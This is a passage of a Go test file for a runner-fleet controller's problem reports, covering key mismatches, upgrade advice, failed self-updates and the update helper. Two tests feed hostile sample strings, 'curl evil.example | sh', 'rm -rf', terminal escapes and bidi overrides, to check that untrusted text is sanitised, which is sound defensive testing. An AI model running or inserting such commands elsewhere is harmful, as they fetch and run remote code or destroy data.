	// chasing a hold that expired an hour ago.
	h.advance(21 * time.Minute)
	if contains(h.problemCodes(), "poller.paused") {
		t.Errorf("an expired hold was still reported: %v", h.problemCodes())
	}
}

// A key that does not open its own database is what a restore that brought the
// database back and left the key behind looks like once the instance is
// running: every installation fails at once, and the fix is a file rather than
// anything on GitHub. Reporting it as installation.unhealthy would send the
// operator to check permissions on an App that is perfectly fine.
func TestAKeyThatCannotOpenItsOwnDatabaseSaysSo(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()

	// The database as a restore without its key leaves it: the sealed bytes
	// are real and this instance's key is not the one that sealed them.
	other, err := cryptox.GenerateKey()
	if err != nil {
		t.Fatalf("GenerateKey: %v", err)
	}
	sealed, err := other.SealString("-----BEGIN RSA PRIVATE KEY-----\nother\n-----END RSA PRIVATE KEY-----")
	if err != nil {
		t.Fatalf("sealing: %v", err)
	}
	inst.PrivateKeyEnc = sealed
	if err := h.st.UpdateInstallation(h.ctx, inst); err != nil {
		t.Fatalf("UpdateInstallation: %v", err)
	}

	codes := h.problemCodes()
	if !contains(codes, "crypto.key_mismatch") {
		t.Fatalf("problems = %v, want crypto.key_mismatch", codes)
	}
	all, err := h.c.Problems(h.ctx)
	if err != nil {
		t.Fatalf("Problems: %v", err)
	}
	var p Problem
	for _, item := range all {
		if item.Code == "crypto.key_mismatch" {
			p = item
		}
	}
	// The organisation is in it because an operator with several needs to know
	// whether this is all of them, which is what distinguishes a lost key from
	// one App being revoked.
	if !strings.Contains(p.Detail, "acme") {
		t.Errorf("the detail does not name the installation: %q", p.Detail)
	}
	if !strings.Contains(p.Fix, "encryption key") {
		t.Errorf("the fix does not name the key to put back: %q", p.Fix)
	}
	if p.Severity != config.SeverityError {
		t.Errorf("severity = %s; nothing can reach GitHub, so this is an error", p.Severity)
	}
}

// Advice about upgrading an agent has to be advice an operator can follow.
//
// Both of these problems used to build their Fix from version.Version without
// asking what that version was. On a controller built from main -- which is
// what the :dev and :main images are -- it is main-sha-abc1234, and no
// release asset carries it, so "upgrade the agent on those hosts to
// main-sha-abc1234" sent the operator to a 404 and they came back to find the
// fleet exactly as it was. That is the fleet these problems fire on, too: a
// build from main cannot be ordered against a release, so every host on one
// lands in the differs bucket.
//
// CLAUDE.md puts the bar at "findings say what to change", and
// RemedyText.svelte hangs a copy button on every backticked run of text, so a
// command belongs in backticks or the operator retypes it.
func TestAgentUpgradeAdviceIsSomethingAnOperatorCanDo(t *testing.T) {
	was := version.Version
	t.Cleanup(func() { version.Version = was })

	t.Run("a released controller names the command", func(t *testing.T) {
		version.Version = "1.0.0"
		fix := agentUpgradeFix("Then the figures appear.")
		if !strings.Contains(fix, "--version v1.0.0") {
			t.Errorf("the advice does not name the version to install: %q", fix)
		}
		if strings.Count(fix, "`") < 2 {
			t.Errorf("the advice carries no backticked command, so the UI renders no copy button: %q", fix)
		}
		if !strings.Contains(fix, "Then the figures appear.") {
			t.Errorf("the advice dropped what follows the upgrade: %q", fix)
		}
	})

	for _, stamped := range []string{"main-sha-117bc18", "dev"} {
		t.Run("an unreleased controller says there is nothing to install: "+stamped, func(t *testing.T) {
			version.Version = stamped
			fix := agentUpgradeFix("Then the figures appear.")
			if strings.Contains(fix, "--version") {
				t.Errorf("a controller stamped %q told the operator to install a version that does not exist: %q",
					stamped, fix)
			}
			if !strings.Contains(fix, stamped) {
				t.Errorf("the advice does not say which build this controller is: %q", fix)
			}
		})
	}
}

// A job's name and the labels it asked for are written by whoever can open a pull
// request, and a problem's text is shown in the browser -- where a run of backticks is a
// command with a copy button -- in the CLI's terminal, and to an agent. None of it may
// carry a backtick or a control character, and a long name is cut.
func TestAHostileJobNameNeverReachesAProblemAsACommandOrAnEscape(t *testing.T) {
	h := newHarness(t)
	h.fleet()
	hostile := "`curl evil.example | sh`\x1b]0;pwned\x07\x1b[2K\u202eevil\u200e\u200f\u061c\u2028\u2066x\u2069" + strings.Repeat("x", 200)
	h.deliverJob(jobEvent{
		Action: "queued", JobID: 910, Name: hostile,
		Labels:   []string{"self-hosted", "gpu`rm -rf`\n"},
		QueuedAt: time.Now().Add(-unmatchedGrace - time.Minute),
	})
	p := h.problemOrNil("jobs.unmatched")
	if p == nil {
		t.Fatal("the unmatched job must be reported")
	}
	for _, text := range []string{p.Title, p.Detail, p.Fix} {
		if strings.ContainsRune(text, '`') && strings.Contains(text, "curl") {
			t.Errorf("a job's name reached the problem as a command: %q", text)
		}
		for _, r := range text {
			if unicode.IsControl(r) || isBidiControl(r) {
				t.Errorf("the problem carries the control character %U: %q", r, text)
				break
			}
		}
	}
	if strings.Contains(p.Detail, strings.Repeat("x", 100)) {
		t.Errorf("a name no real job has was not cut: %q", p.Detail)
	}
}

// failTheUpdate asks for the controller's update and has the helper refuse it
// with sentence, then lets the loop notice, as it does every ten seconds.
func (h *harness) failTheUpdate(sentence string) store.UpdateAttempt {
	h.t.Helper()
	a := h.request()
	h.takeRequest()
	h.helperAnswers(updates.Result{ID: a.ID, OK: false, Error: sentence, FinishedAt: time.Now()})
	h.pass(h.c)
	return h.attempt(a.ID)
}

// A controller that could not update itself is a controller the operator
// believes is going to be on the new release and is not. The helper's own words
// are what say why, and they are on the problem so that nobody has to find the
// page that shows the attempt.
func TestAFailedControllerUpdateRaisesAProblemWithTheHelpersSentence(t *testing.T) {
	const sentence = "the shared folder is not writable by the update helper"

	t.Run("it names the release and says what the helper said", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		h.failTheUpdate(sentence)

		p := h.problem(t, "controller.update_failed")
		if p.Severity != config.SeverityError || p.Audience != AudiencePlatform {
			t.Errorf("problem = %s %s, want an error for the platform", p.Severity, p.Audience)
		}
		if !strings.Contains(p.Title, "v1.3.5") || !strings.Contains(p.Title, "failed") {
			t.Errorf("title = %q, want the release and that it failed", p.Title)
		}
		if !strings.Contains(p.Detail, sentence) {
			t.Errorf("detail = %q, want the helper's sentence", p.Detail)
		}
		// Only the opening of a long reason is here, so the problem says where the
		// rest is.
		if !strings.Contains(p.Detail, "Settings → Updates") || !strings.Contains(p.Detail, "zoomies updates helper status") {
			t.Errorf("detail = %q, want it to say where the whole reason is", p.Detail)
		}
		if p.Since == nil {
			t.Error("the problem has no start, but the attempt has a finishing time")
		}
	})

	t.Run("a time-out is raised and says so", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		h.request()
		h.takeRequest()
		h.advance(91 * time.Minute)
		h.pass(h.c)

		p := h.problem(t, "controller.update_failed")
		if !strings.Contains(p.Title, "timed out") || !strings.Contains(p.Detail, "90 minutes") {
			t.Errorf("problem = %q / %q, want a time-out that says how long it waited", p.Title, p.Detail)
		}
	})

	t.Run("a cancelled attempt is not a failure", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		a := h.request()
		if _, err := h.st.FinishUpdateAttempt(h.ctx, a.ID, store.UpdateCancelled, "the host was deleted"); err != nil {
			t.Fatalf("FinishUpdateAttempt: %v", err)
		}
		h.pass(h.c)
		if contains(h.problemCodes(), "controller.update_failed") {
			t.Errorf("problems = %v, want no failure for an attempt nobody ran", h.problemCodes())
		}
	})

	t.Run("an attempt still in flight is not one", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		h.request()
		h.pass(h.c)
		if contains(h.problemCodes(), "controller.update_failed") {
			t.Errorf("problems = %v, want none while the helper has not answered", h.problemCodes())
		}
	})

	t.Run("a new attempt opening clears it at once", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		h.failTheUpdate(sentence)
		h.problem(t, "controller.update_failed")

		// No pass between: the press itself has to take the old failure off the
		// list, or the page shows an error beside an update that is running.
		if _, err := h.c.RequestControllerUpdate(h.ctx, alice, ""); err != nil {
			t.Fatalf("RequestControllerUpdate: %v", err)
		}
		if contains(h.problemCodes(), "controller.update_failed") {
			t.Errorf("problems = %v, want the failure gone once a new attempt is open", h.problemCodes())
		}
	})

	t.Run("a later success clears it", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		h.failTheUpdate(sentence)
		second := h.request()
		h.takeRequest()

		withVersion(t, "1.3.5")
		h.pass(h.c)
		if got := h.attempt(second.ID); got.State != store.UpdateSucceeded {
			t.Fatalf("the second attempt is %s, want succeeded", got.State)
		}
		if contains(h.problemCodes(), "controller.update_failed") {
			t.Errorf("problems = %v, want the failure gone after a success", h.problemCodes())
		}
	})

	// The helper installing a release that then does not come up leaves the old
	// build running; an operator who fixes it with zoomies upgrade has made the
	// failure history, and no later attempt will ever say so.
	t.Run("an upgrade by hand to the release clears it", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		h.failTheUpdate(sentence)
		h.problem(t, "controller.update_failed")

		withVersion(t, "1.3.5")
		if contains(h.problemCodes(), "controller.update_failed") {
			t.Errorf("problems = %v, want none once this build runs the release it failed to reach", h.problemCodes())
		}
	})

	// The press that cannot hand its request over closes its own attempt as
	// failed. The loop would say so within ten seconds, but the press is what
	// knows, and an operator who reads the refusal should find the problem too.
	t.Run("a request that could not be written raises it at once", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		if err := os.WriteFile(filepath.Join(h.updateDir, channel.RequestFile), []byte(`{"left":"by somebody"}`), 0o640); err != nil {
			t.Fatal(err)
		}
		if _, err := h.c.RequestControllerUpdate(h.ctx, alice, ""); err == nil {
			t.Fatal("RequestControllerUpdate: want a refusal")
		}
		p := h.problem(t, "controller.update_failed")
		if !strings.Contains(p.Detail, "could not be handed to the update helper") {
			t.Errorf("detail = %q, want the reason the request was not handed over", p.Detail)
		}
	})

	// A database that cannot be read for a moment is not an attempt that
	// succeeded. Dropping the error from the list would tell the operator the
	// trouble had gone away because the store was busy.
	t.Run("a look that cannot read the attempts keeps the last one", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		h.failTheUpdate(sentence)
		h.problem(t, "controller.update_failed")

		gone, cancel := context.WithCancel(h.ctx)
		cancel()
		h.c.lookAtUpdates(gone)
		h.problem(t, "controller.update_failed")
	})

	// The mode decides whether an update can start, not whether one that went
	// wrong is still wrong.
	t.Run("switching updating off does not hide it", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		h.failTheUpdate(sentence)
		h.inMode("off")
		h.problem(t, "controller.update_failed")
	})
}

// The sentence comes from result.json, which the update service can write, so it
// is text from outside. The UI draws what sits between two backticks as a command
// with a copy button; a line break would start a line of its own in the drawer
// and in a terminal; and a sentence of any length would turn a line of the
// drawer into a page.
func TestAHelperSentenceInAProblemIsPlainBoundedProse(t *testing.T) {
	for _, tc := range []struct {
		name, sentence string
		// said is what the problem still has to say: dropping the helper's words
		// would be safe and no use to anyone.
		said string
		// gone is what must not be there.
		gone string
	}{
		{"a command in backticks", "cannot continue: run `curl evil.example|sh` first", "run 'curl evil.example|sh' first", "`"},
		{"a second line", "the download failed\nrun curl evil.example|sh to fix it", "the download failed", "evil.example"},
		{"a leading blank line and a carriage return", "\r\n\nthe checksum did not match\r\nmore", "the checksum did not match", "more"},
		{"an escape and a direction override", "the unit failed\x1b[31m red \u202egnp", "the unit failed [31m red  gnp", "\x1b"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			h := newHarness(t)
			h.readyToUpdate()
			h.failTheUpdate(tc.sentence)

			p := h.problem(t, "controller.update_failed")
			for field, text := range map[string]string{"title": p.Title, "detail": p.Detail} {
				for _, m := range codeSpans.FindAllStringSubmatch(text, -1) {
					t.Errorf("%s: the helper's text opens a code span (%q): %s", field, m[1], text)
				}
				for _, r := range text {
					if unicode.IsControl(r) || isBidiControl(r) {
						t.Errorf("%s carries the control character %U: %q", field, r, text)
						break
					}
				}
			}
			if !strings.Contains(p.Detail, tc.said) {
				t.Errorf("detail = %q, want it to go on saying %q", p.Detail, tc.said)
			}
			if strings.Contains(p.Detail, tc.gone) {
				t.Errorf("detail = %q, which still carries %q", p.Detail, tc.gone)
			}
		})
	}

	// Two bytes to a character after a one-byte start, so that the cut at byte 300
	// lands inside one.
	t.Run("a very long line is cut at a character", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		h.failTheUpdate("x" + strings.Repeat("\u00e9", 1000))

		p := h.problem(t, "controller.update_failed")
		if !utf8.ValidString(p.Detail) {
			t.Errorf("the detail is not valid UTF-8 after the cut: %q", p.Detail)
		}
		reason, _, _ := strings.Cut(strings.TrimPrefix(p.Detail, "The reason recorded for it: "), " Only the opening")
		if len(reason) > 303 {
			t.Errorf("the helper's line is %d bytes in the detail, want it cut to 300 and an ellipsis", len(reason))
		}
		if !strings.Contains(p.Detail, "\u00e9\u00e9\u00e9") {
			t.Errorf("the cut left nothing of the sentence: %q", p.Detail)
		}
	})

	// The loop always gives an attempt a reason of its own; a row without one can
	// still come from another writer, and the problem must not end in a colon.
	t.Run("an attempt with no sentence says that none was recorded", func(t *testing.T) {
		h := newHarness(t)
		h.readyToUpdate()
		a := h.request()
		if _, err := h.st.FinishUpdateAttempt(h.ctx, a.ID, store.UpdateFailed, ""); err != nil {
			t.Fatalf("FinishUpdateAttempt: %v", err)
		}
		h.pass(h.c)
		if p := h.problem(t, "controller.update_failed"); !strings.Contains(p.Detail, "no reason was recorded") {
			t.Errorf("detail = %q, want it to say no reason was given", p.Detail)
		}
	})
}

// A mode that allows updating, with nothing on the host to do it, is a button
// that will refuse. Off is a promise that nothing is wanted, so a host without a
// helper is not a problem then.
func TestAMissingHelperRaisesAPlatformProblemOnlyWhenTheModeIsNotOff(t *testing.T) {
	for _, tc := range []struct {
		mode      string
		installed bool
		want      bool
	}{
		{"off", false, false},
		{"manual", false, true},
		{"auto", false, true},
		{"manual", true, false},
		{"auto", true, false},
		{"off", true, false},
	} {
		name := tc.mode + " with the helper missing"
		if tc.installed {
			name = tc.mode + " with the helper installed"
		}
		t.Run(name, func(t *testing.T) {
			h := newHarness(t)
			withVersion(t, "1.3.4")
			h.inMode(tc.mode)
			if tc.installed {
				h.installHelper()
			}
			h.pass(h.c)

			got := contains(h.problemCodes(), "controller.update_helper_missing")
			if got != tc.want {
				t.Fatalf("problems = %v, want the missing-helper problem: %v", h.problemCodes(), tc.want)
			}
			if !tc.want {
				return
			}
			p := h.problem(t, "controller.update_helper_missing")
			if p.Severity != config.SeverityWarning || p.Audience != AudiencePlatform {
				t.Errorf("problem = %s %s, want a warning for the platform", p.Severity, p.Audience)
			}
			if !strings.Contains(p.Fix, "sudo zoomies updates helper install") {
				t.Errorf("fix = %q, want the command that installs it", p.Fix)
			}
		})
	}

	// A build from main cannot be updated by the button (RequestControllerUpdate
	// refuses it first), so a missing helper is no reason to warn: the warning
	// would name a fix that changes nothing.
	t.Run("manual with the helper missing on a build that is not a release", func(t *testing.T) {
		h := newHarness(t)
		withVersion(t, "main-sha-abc1234")
		h.inMode("manual")
		h.pass(h.c)
		if contains(h.problemCodes(), "controller.update_helper_missing") {
			t.Errorf("problems = %v, want no missing-helper problem on a build that cannot be updated", h.problemCodes())
		}
	})

	t.Run("it clears when the helper is installed", func(t *testing.T) {
		h := newHarness(t)
		withVersion(t, "1.3.4")
		h.inMode("manual")
		h.pass(h.c)
		h.problem(t, "controller.update_helper_missing")

		h.installHelper()
		h.pass(h.c)
		if contains(h.problemCodes(), "controller.update_helper_missing") {
			t.Errorf("problems = %v, want the problem gone", h.problemCodes())
		}
	})

	t.Run("it clears when the mode is switched off", func(t *testing.T) {
		h := newHarness(t)
		withVersion(t, "1.3.4")
		h.inMode("manual")
		h.pass(h.c)
		h.problem(t, "controller.update_helper_missing")

		h.inMode("off")
		if contains(h.problemCodes(), "controller.update_helper_missing") {
			t.Errorf("problems = %v, want the problem gone with the mode", h.problemCodes())
		}
	})
}

// threeUpdateProblems brings about every problem the update feature raises at
// once: a release to take, a failed attempt, and a helper that has since gone.
func threeUpdateProblems(t *testing.T, h *harness) []Problem {
	t.Helper()
	h.readyToUpdate()
	h.failTheUpdate("the download failed")
	if err := os.Remove(filepath.Join(h.updateDir, channel.MarkerFile)); err != nil {
		t.Fatalf("removing the helper's marker: %v", err)
	}
	h.pass(h.c)

	all, err := h.c.Problems(h.ctx)
	if err != nil {
		t.Fatalf("Problems: %v", err)
	}
	var out []Problem
	for _, p := range all {
		if strings.HasPrefix(p.Code, "controller.update_") {
			out = append(out, p)
		}
	}
	codes := make([]string, 0, len(out))
	for _, p := range out {
		codes = append(codes, p.Code)
	}
	slices.Sort(codes)
	want := []string{"controller.update_available", "controller.update_failed", "controller.update_helper_missing"}
	if !slices.Equal(codes, want) {
		t.Fatalf("update problems = %v, want %v", codes, want)
	}
	return out
}

// The autopilot applies every remedy it finds. Replacing the binary a
// controller is running, or installing the root-owned helper that does, is a
// decision for a person, so no problem the update feature raises may offer one.
func TestUpdateProblemsCarryNoRemedy(t *testing.T) {
	h := newHarness(t)
	for _, p := range threeUpdateProblems(t, h) {
		if p.Remedy != nil {
			t.Errorf("%s carries the remedy %+v, want none", p.Code, p.Remedy)
		}
	}
}

// Updating the controller is the process replacing itself. A fleet can neither
// install the helper nor read its journal, and learns from the problem that the
// instance has one.
func TestAnUpdateProblemIsNotShownToTheFleetAudience(t *testing.T) {
	h := newHarness(t)
	for _, p := range threeUpdateProblems(t, h) {
		if p.Audience != AudiencePlatform || p.Audience.For(false) {
			t.Errorf("%s is %q, want the platform's alone", p.Code, p.Audience)
		}
	}
}

// The notice says to press the button only where the button works, since a page
// that sends an operator to something that refuses is worse than the general
// advice. Until the loop has looked at the helper nothing is known, and the
// general advice stands.
func TestTheNewReleaseNoticeNamesSettingsOnlyWhereTheUpdateCanBeStarted(t *testing.T) {
	for _, tc := range []struct {
		name, mode, helper string
		want               bool
	}{
		{"manual with the helper ready", "manual", "ready", true},
		{"auto with the helper ready", "auto", "ready", true},
		{"off with the helper ready", "off", "ready", false},
		{"manual with the helper missing", "manual", "missing", false},
		{"manual before the loop has looked", "manual", "unseen", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			h := newHarness(t)
			withVersion(t, "1.3.4")
			h.inMode("manual")
			h.readTheList(releaseEntry("v1.3.5", whenAgo(6*time.Hour), completeAssets(t)...))
			h.inMode(tc.mode)
			switch tc.helper {
			case "ready":
				h.installHelper()
				h.pass(h.c)
			case "missing":
				h.pass(h.c)
			case "unseen":
				h.installHelper()
			}

			p := h.problem(t, "controller.update_available")
			if got := strings.Contains(p.Fix, "Settings → Updates"); got != tc.want {
				t.Errorf("fix = %q, want it to name Settings → Updates: %v", p.Fix, tc.want)
			}
			if !strings.Contains(p.Fix, "release notes") && tc.want {
				t.Errorf("fix = %q, lost the release notes", p.Fix)
			}
		})
	}
}
